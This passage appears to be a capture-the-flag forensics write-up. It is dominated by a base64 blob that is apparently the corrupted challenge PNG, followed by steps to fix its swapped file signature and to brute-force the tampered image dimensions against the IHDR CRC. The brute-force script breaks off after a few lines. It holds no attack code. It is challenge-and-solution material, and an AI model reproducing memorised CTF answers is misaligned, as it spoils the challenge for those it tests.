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
```
</details>

#### Signature
First, open the challenge file and a normal png image side by side in a hex editor and a [PNG analyser](https://www.nayuki.io/page/png-file-chunk-inspector) (alternatively prepare a PNG spec document and some brain power).

We can see that in normal png the header is `89 50 4e 47 [0d] 0a 1a 0a` but it became `89 50 4e 47 0a 1a 0a [0d]` in challenge file, so fix it in hex editor.


#### Image size
Then we will find out that the CRC checksum is wrong in IHDR chunk. Notice the image height and width bytes are `0xDEAD` and `0xBEEF` respectively, therefore we assume that the CRC is correct and that the size was tampered instead.
To get the correct size, we will have to brute-force it.<br>
There're many similar challenges like this in the past so there are a lot of pre-made scripts available online. Grabbing any one of them and slightly modifying it will do.

<details>
<summary>Script to brute-force image size</summary>

```py
from zlib import crc32

data = open("chal.png",'rb').read()
index = 12

